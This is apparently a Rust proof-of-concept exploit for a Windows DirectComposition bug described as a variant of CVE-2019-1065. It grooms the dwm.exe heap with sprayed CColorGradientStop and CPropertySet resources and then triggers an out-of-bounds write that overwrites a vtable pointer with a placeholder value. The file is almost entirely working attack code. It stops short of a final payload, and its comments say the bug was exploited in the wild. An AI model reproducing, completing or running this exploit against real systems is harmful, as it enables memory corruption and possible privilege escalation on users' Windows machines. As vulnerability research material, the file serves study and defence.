//when they patched UpdateProperty<T> after CVE 2019 1065 they did not
//patch the equivalent in dwmcore.dll. In addition, win32kbase AddProperty<T>
//still adds a property if it is provided an incorrect propertyid, but it returns failure
//and the property is not marshaled to dwm.exe. so you can cause an inconsistency in the
//number of properties in win32kbase and dwmcore and trigger the same oob write in dwm.exe
//it's just kind of a pain because CTableTransferEffectMarshaler filter buffer doesn't get
//marshaled so you have to use a third set of PropertySet to get the same arbitrary write
//primitive, and this is already a popular object size in dwm.exe, so this is less reliable.
//But you can also just overwrite the vtable pointer of a differently-typed object. I didn't
//look at this one too much because if it fails dwm.exe failfast and calls WER, so it's kind of
//noisy. But it was found "in the wild" so go figure
#![feature(core_intrinsics)]
use winapi::{
    um::{
        libloaderapi::{GetModuleHandleA, LoadLibraryA, GetProcAddress}},
    shared::{
        ntdef::{HANDLE, PHANDLE, NTSTATUS, NT_SUCCESS},
        minwindef::{LPVOID, LPDWORD, LPHANDLE, DWORD, FALSE}}
};
use std::{
    ffi::CString,
    mem::transmute,
    process::exit,
    ptr::null_mut,
    intrinsics::breakpoint,
    sync::{RwLock, RwLockWriteGuard, RwLockReadGuard}
};
use lazy_static::lazy_static;

type NtDCompositionCreateChannel = extern "stdcall" fn(
    pchannelhandle: LPHANDLE, psectionsize: *mut usize,
    psectionbasemapinprogress: *mut LPVOID) -> NTSTATUS;
type NtDCompositionProcessChannelBatchBuffer = extern "stdcall" fn(
    hchannel: HANDLE, dwstart: DWORD, pargs1: LPDWORD, pargs2: LPDWORD
) -> NTSTATUS;
type NtDCompositionCommitChannel = extern "stdcall" fn(
    hchannel: HANDLE, poutargs1: LPDWORD, poutargs2: LPDWORD, dwstart: DWORD,
    hsynchobj: HANDLE
) -> NTSTATUS;
type NtDCompositionDestroyChannel = extern "stdcall" fn(
    hchannel: HANDLE
) -> NTSTATUS;

	
#[repr(C)]
enum DCOMPOSITION_COMMAND_ID
{
	ProcessCommandBufferIterator,
	CreateResource,
	OpenSharedResource,
	ReleaseResource,
	GetAnimationTime,
	CapturePointer,
	OpenSharedResourceHandle,
	SetResourceCallbackId,
	SetResourceIntegerProperty,
	SetResourceFloatProperty,
	SetResourceHandleProperty,
	SetResourceHandleArrayProperty,
	SetResourceBufferProperty,
	SetResourceReferenceProperty,
	SetResourceReferenceArrayProperty,
	SetResourceAnimationProperty,
	SetResourceDeletedNotificationTag,
	AddVisualChild,
	RedirectMouseToHwnd,
	SetVisualInputSink,
	RemoveVisualChild
}

#[derive(Clone)]
struct WIN32IMPORTS {
    createchannel: usize,
    processchannelbatchbuffer: usize,
    commitchannel: usize,
    destroychannel: usize
}

lazy_static!(
    static ref FS0HANDLE : RwLock<usize> = RwLock::new(0);
    static ref FS0MAP : RwLock<usize> = RwLock::new(0);
    static ref FS2HANDLE : RwLock<usize> = RwLock::new(0);
    static ref FS2MAP : RwLock<usize> = RwLock::new(0);
);

fn main() {
    unsafe {

    let w32imports: WIN32IMPORTS = resolve_symbols();
    println!(">Defragmenting heap with CColorGradientStop Resources");
    fengshui0(w32imports.clone());
    println!(">Creating+Releasing CPropertySet Resources with 0x60 properties");
    fengshui1(w32imports.clone());
    println!(">Creating CPropertySet Resources with 0x40 properties");
    fengshui2(w32imports.clone());
    println!(">Making holes in CColorGradientStop Resources");
    fengshui3(w32imports.clone());
    println!(">Making new properties for CPropertySet Resources");
    fengshui4(w32imports.clone());
    println!(">Corrupting CColorGradientStop Resources");
    oobwrite(w32imports.clone());
    //"todo" (probably won't): insert SetBufferProperty payload here
    //println!(">Freeing CColorGradientStop Resources");
    closechannel(w32imports.clone());
    };
}

//only a few imports for this one
unsafe fn resolve_symbols() -> WIN32IMPORTS {
    let u32str = CString::new("user32.dll").expect("CString::new failed");
    let w32str = CString::new("win32u").expect("CString::new failed");
    let screatechannel= CString::new(
        "NtDCompositionCreateChannel").expect("CString::new failed");
    let scommitchannel= CString::new(
        "NtDCompositionCommitChannel").expect("CString::new failed");
    let sprocessbuf = CString::new(
        "NtDCompositionProcessChannelBatchBuffer").expect("CString::new failed");
    let sdestroychannel = CString::new(
        "NtDCompositionDestroyChannel").expect("CString::new failed");
    LoadLibraryA(u32str.as_ptr());
    let hndwn32u = GetModuleHandleA(w32str.as_ptr());
    let szcreatechannel: usize = GetProcAddress(
        hndwn32u, screatechannel.as_ptr()) as usize;
    let szcommmitchannel: usize = GetProcAddress(
        hndwn32u, scommitchannel.as_ptr()) as usize;
    let szprocessbuf: usize = GetProcAddress(
        hndwn32u, sprocessbuf.as_ptr()) as usize;
    let szdestroychannel: usize = GetProcAddress(
        hndwn32u, sdestroychannel.as_ptr()) as usize;
    if szcreatechannel == 0 || szcommmitchannel == 0 || szprocessbuf == 0 || 
    szdestroychannel == 0 {
        println!("Could not resolve win32 functions");
        exit(1)
    }
    let w32imports: WIN32IMPORTS = WIN32IMPORTS {
        createchannel: szcreatechannel,
        processchannelbatchbuffer: szprocessbuf,
        commitchannel: szcommmitchannel,
        destroychannel: szdestroychannel
    };
    w32imports
}

unsafe fn fengshui0(win32imports: WIN32IMPORTS){
    //set up some variables
    let sectionsize: usize = 0x11000;
    let pmappedaddr: LPVOID = null_mut();
    let mut hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    //save the channel handle for later lol
    let phchannel: PHANDLE = &mut hchannel;
    let mut gpfs0handle: RwLockWriteGuard<usize> = FS0HANDLE.write().unwrap();
    *gpfs0handle = *phchannel as usize;
    drop(gpfs0handle);
    //save the buffer address
    let mut gpfs0map: RwLockWriteGuard<usize> = FS0MAP.write().unwrap();
    *gpfs0map = qwpmappedaddr;
    drop(qwpmappedaddr);
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = 0x1000;
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        *((&hresource as *const _) as *mut usize) = 0x1 + i;
        *((qwpmappedaddr + (i*0x10)) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + (i*0x10) + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //CColorGradientStopMarshaler
        *((qwpmappedaddr + (i*0x10) + 8) as *mut u8) = 0x15;
        *((qwpmappedaddr + (i*0x10) + 0xc) as *mut i32) = FALSE;
    }
    ntstatus = processchannelbatchbuffer(hchannel, 0x10000, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x10000, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui1(win32imports: WIN32IMPORTS) {
    //set up some variables
    let sectionsize: usize = 0x1f0000;
    let pmappedaddr: LPVOID = null_mut();
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = 0x300;
    //make resources with properties
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let buffoffs: usize = i * 0x1e4;
        let resourceid: usize = 0x100 + i;
        *((&hresource as *const _) as *mut usize) = resourceid;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //CPropertySetMarshaler
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x86;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = FALSE;
        for j in 0..=0xc {
            //add a property:
            *((qwpmappedaddr + buffoffs + 0x10 + (j*0x24)) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
            *((qwpmappedaddr + buffoffs + 0x14 + (j*0x24)) as *mut u32) = *((&hresource as *const _) as *mut u32);
            //propertyid
            *((qwpmappedaddr + buffoffs + 0x18 + (j*0x24)) as *mut u32) = 0x0;
            //propertysize
            *((qwpmappedaddr + buffoffs + 0x1c + (j*0x24)) as *mut u32) = 0x14;
            *((qwpmappedaddr + buffoffs + 0x20 + (j*0x24)) as *mut u32) = j as u32;
            *((qwpmappedaddr + buffoffs + 0x24 + (j*0x24)) as *mut u32) = (j*8) as u32;
            //type
            *((qwpmappedaddr + buffoffs + 0x28 + (j*0x24)) as *mut u32) = 0x23;
            //array 1
            *((qwpmappedaddr + buffoffs + 0x2c + (j*0x24)) as *mut u32) = 0xffffffff;
            //array 2
            *((qwpmappedaddr + buffoffs + 0x30 + (j*0x24)) as *mut u32) = 0xffffffff;
        }
    }
    ntstatus = processchannelbatchbuffer(hchannel, 0x5ac00, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x5ac00, hsynchobj);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
    //release resources with properties
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let buffoffs: usize = i * 8; 
        let propertyid: usize = 0x100 + i;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::ReleaseResource as u32;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
    }
    ntstatus = processchannelbatchbuffer(hchannel, 0x1800, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x5ac00, hsynchobj);
    //std::thread::sleep(std::time::Duration::from_secs(5));
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui2(win32imports: WIN32IMPORTS) {
    //set up some variables
    let sectionsize: usize = 0x20000;
    let pmappedaddr: LPVOID = null_mut();
    let mut hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    //unsafe{} af
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let createchannel: NtDCompositionCreateChannel = transmute(
        win32imports.createchannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    //create channel
    let mut ntstatus = createchannel(
        (&hchannel as *const _) as *mut HANDLE,
        (&sectionsize as *const _) as *mut usize,
        (&pmappedaddr as *const _) as *mut LPVOID);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCreateChannel failed: {:#x}", ntstatus);
        exit(1);
    }
    println!("\tChannel handle: {:#x}",
        *((&hchannel as *const _) as *mut usize) as usize);
    let qwpmappedaddr: usize = *((&pmappedaddr as *const _) as *mut usize) as usize;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    //save the channel handle for later lol
    let phchannel: PHANDLE = &mut hchannel;
    let mut gpfs2handle: RwLockWriteGuard<usize> = FS2HANDLE.write().unwrap();
    *gpfs2handle = *phchannel as usize;
    drop(gpfs2handle);
    //save the buffer address
    let mut gpfs2map: RwLockWriteGuard<usize> = FS2MAP.write().unwrap();
    *gpfs2map = qwpmappedaddr;
    drop(qwpmappedaddr);
    let spraysize: usize = 0x100;
    //make resources with properties
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let buffoffs: usize = i * 0x154;
        let propertyid: usize = 0x100 + i;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::CreateResource as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //CPropertySetMarshaler
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x86;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = FALSE;
        for i in 0..=0x8 {
            //add a property:
            *((qwpmappedaddr + buffoffs + 0x10 + (i * 0x24)) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
            *((qwpmappedaddr + buffoffs + 0x14 + (i * 0x24)) as *mut u32) = *((&hresource as *const _) as *mut u32);
            //propertyid
            *((qwpmappedaddr + buffoffs + 0x18 + (i * 0x24)) as *mut u32) = 0x0;
            //propertysize
            *((qwpmappedaddr + buffoffs + 0x1c + (i * 0x24)) as *mut u32) = 0x14;
            *((qwpmappedaddr + buffoffs + 0x20 + (i * 0x24)) as *mut u32) = i as u32;
            *((qwpmappedaddr + buffoffs + 0x24 + (i * 0x24)) as *mut u32) = (i*8) as u32;
            //type
            *((qwpmappedaddr + buffoffs + 0x28 + (i * 0x24)) as *mut u32) = 0x23;
            //array 1
            *((qwpmappedaddr + buffoffs + 0x2c + (i * 0x24)) as *mut u32) = 0xffffffff;
            //array 2
            *((qwpmappedaddr + buffoffs + 0x30 + (i * 0x24)) as *mut u32) = 0xffffffff;
        }
    }
    //std::thread::sleep(std::time::Duration::from_secs(1));
    //breakpoint();
    ntstatus = processchannelbatchbuffer(hchannel, 0x15400, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x1000, hsynchobj);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui3(win32imports: WIN32IMPORTS) {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs0pmappedaddr: RwLockReadGuard<usize> = FS0MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs0pmappedaddr;
    let gps0handle: RwLockReadGuard<usize> = FS0HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps0handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    //let spraysize: usize = 0x500;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    for i in (0x50..0x1000).step_by(2) {
        let hresource: HANDLE = null_mut();
        let buffindex: usize = (i - 0x50 ) / 0x2;
        let buffoffs: usize = buffindex * 8; 
        let propertyid: usize = i;
        *((&hresource as *const _) as *mut usize) = propertyid;
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::ReleaseResource as u32;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, 0x3ec0, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x3ec0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn fengshui4(win32imports: WIN32IMPORTS) {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    //unsafe{} af
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps2handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = 0x100;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    //std::thread::sleep(std::time::Duration::from_secs(1));
    //breakpoint();
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x100 + i;
        let buffoffs: usize = i * 0x24; 
        *((&hresource as *const _) as *mut usize) = propertyid;
        //add a property:
        *((qwpmappedaddr + buffoffs) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        //iPropertyid
        *((qwpmappedaddr + buffoffs + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //bUpdate
        *((qwpmappedaddr + buffoffs + 0x8) as *mut u32) = 0x0;
        //iApplicationChannelType
        *((qwpmappedaddr + buffoffs + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + buffoffs + 0x10) as *mut u32) = 0x9;
        *((qwpmappedaddr + buffoffs + 0x14) as *mut u32) = 0x48;
        //iPropertyType
        *((qwpmappedaddr + buffoffs + 0x18) as *mut u32) = 0x23;
        //array 1
        *((qwpmappedaddr + buffoffs + 0x1c) as *mut u32) = 0xffffffff;
        //array 2
        *((qwpmappedaddr + buffoffs + 0x20) as *mut u32) = 0xffffffff;
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, 0x2400, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x1000, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn oobwrite(win32imports: WIN32IMPORTS) {
    //set up some variables
    let hchannel: HANDLE = null_mut();
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    //import library functions
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gfs2pmappedaddr: RwLockReadGuard<usize> = FS2MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs2pmappedaddr;
    let gps2handle: RwLockReadGuard<usize> = FS2HANDLE.read().unwrap();
    *((&hchannel as *const _) as *mut usize) = *gps2handle;
    println!("\tMapped section base address: {:#x}", qwpmappedaddr);
    let spraysize: usize = 0x4;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    //call some gadget or something to trigger uaf condition here
    let fakevtable: usize = 0xcafebabecafebabe;
    for i in 0..spraysize {
        let hresource: HANDLE = null_mut();
        let propertyid: usize = 0x100 + i;
        *((&hresource as *const _) as *mut usize) = propertyid;
        //add a property:
        *((qwpmappedaddr) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        //iPropertyid
        *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //bUpdate
        *((qwpmappedaddr + 0x8) as *mut u32) = 0x0;
        //iApplicationChannelType
        *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + 0x10) as *mut u32) = 0xfd;
        *((qwpmappedaddr + 0x14) as *mut u32) = 0x50;
        //iPropertyType
        *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
        //array 1
        *((qwpmappedaddr + 0x1c) as *mut u32) = 0xcafebabe;
        //array 2
        *((qwpmappedaddr + 0x20) as *mut u32) = 0xcafebabe;
        processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
        *((qwpmappedaddr) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        //iPropertyid
        *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //bUpdate
        *((qwpmappedaddr + 0x8) as *mut u32) = 0x0;
        //iApplicationChannelType
        *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + 0x10) as *mut u32) = 0xfe;
        *((qwpmappedaddr + 0x14) as *mut u32) = 0x58;
        //iPropertyType
        *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
        //array 1
        *((qwpmappedaddr + 0x1c) as *mut u32) = 0xcafebabe;
        //array 2
        *((qwpmappedaddr + 0x20) as *mut u32) = 0xcafebabe;
        processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
        *((qwpmappedaddr) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        //iPropertyid
        *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //bUpdate
        *((qwpmappedaddr + 0x8) as *mut u32) = 0x0;
        //iApplicationChannelType
        *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + 0x10) as *mut u32) = 0xff;
        *((qwpmappedaddr + 0x14) as *mut u32) = 0x60;
        //iPropertyType
        *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
        //array 1
        *((qwpmappedaddr + 0x1c) as *mut u32) = 0xcafebabe;
        //array 2
        *((qwpmappedaddr + 0x20) as *mut u32) = 0xcafebabe;
        processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
        *((qwpmappedaddr) as *mut u32) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u32;
        //iPropertyid
        *((qwpmappedaddr + 0x4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //bUpdate
        *((qwpmappedaddr + 0x8) as *mut u32) = 0x1;
        //iApplicationChannelType
        *((qwpmappedaddr + 0xc) as *mut u32) = 0x14;
        *((qwpmappedaddr + 0x10) as *mut u32) = 0xc;
        *((qwpmappedaddr + 0x14) as *mut u32) = 0x60;
        //iPropertyType
        *((qwpmappedaddr + 0x18) as *mut u32) = 0x23;
        //array 1
        *((qwpmappedaddr + 0x1c) as *mut usize) = fakevtable;
        processchannelbatchbuffer(hchannel, 0x24, lpdwargs1, lpdwargs2);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    let ntstatus: NTSTATUS = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x1000, hsynchobj);
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
}

unsafe fn closechannel(win32imports: WIN32IMPORTS) {
    let hchannel: HANDLE = null_mut();
    let dwargs1: DWORD = 0;
    let dwargs2: DWORD = 0;
    let lockobj: u8 = 0;
    let hsynchobj: HANDLE = (&lockobj as *const _) as HANDLE;
    let lpdwargs1: LPDWORD = (&dwargs1 as *const _) as *mut u32;
    let lpdwargs2: LPDWORD = (&dwargs2 as *const _) as *mut u32;
    let destroychannel: NtDCompositionDestroyChannel = transmute(
        win32imports.destroychannel);
    let processchannelbatchbuffer: NtDCompositionProcessChannelBatchBuffer = 
        transmute(win32imports.processchannelbatchbuffer);
    let commitchannel: NtDCompositionCommitChannel = transmute(
        win32imports.commitchannel);
    let gps0handle: RwLockReadGuard<usize> = FS0HANDLE.read().unwrap();
    let gfs0pmappedaddr: RwLockReadGuard<usize> = FS0MAP.read().unwrap();
    let qwpmappedaddr: usize = *gfs0pmappedaddr;
    *((&hchannel as *const _) as *mut usize) = *gps0handle;
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x3ec0, hsynchobj);
    for i in (0x1..0x1000).step_by(2) {
        let buffindex: usize = (i - 1 ) / 0x2;
        let buffoffs: usize = buffindex * 0x20;
        let hresource: HANDLE = null_mut();
        *((&hresource as *const _) as *mut usize) = i;
        *((qwpmappedaddr + buffoffs) as *mut u8) = DCOMPOSITION_COMMAND_ID::SetResourceBufferProperty as u8;
        *((qwpmappedaddr + buffoffs + 4) as *mut u32) = *((&hresource as *const _) as *mut u32);
        //CColorGradientStopMarshaler
        *((qwpmappedaddr + buffoffs + 8) as *mut u8) = 0x1;
        *((qwpmappedaddr + buffoffs + 0xc) as *mut i32) = 0x10;
        *((qwpmappedaddr + buffoffs + 0x10) as *mut i32) = 0;
        *((qwpmappedaddr + buffoffs + 0x14) as *mut i32) = 8;
        *((qwpmappedaddr + buffoffs + 0x18) as *mut i32) = 8;
    }
    let mut ntstatus = processchannelbatchbuffer(hchannel, 0x9980, lpdwargs1, lpdwargs2);
    if !NT_SUCCESS(ntstatus) {
        println!("\tProcess channel batch buffer failed: {:#x}", ntstatus);
        println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
        exit(1);
    }
    println!("\t{:#x} {:#x}", *lpdwargs1, *lpdwargs2);
    ntstatus = commitchannel(hchannel, lpdwargs1, lpdwargs2, 0x3ec0, hsynchobj);
    //breakpoint();
    if !NT_SUCCESS(ntstatus) {
        println!("\tCommit channel failed: {:#x}", ntstatus);
        exit(1);
    }
    let ntstatus: NTSTATUS = destroychannel(hchannel);
    if !NT_SUCCESS(ntstatus) {
        println!("\tdestroychannel failed");
    }
}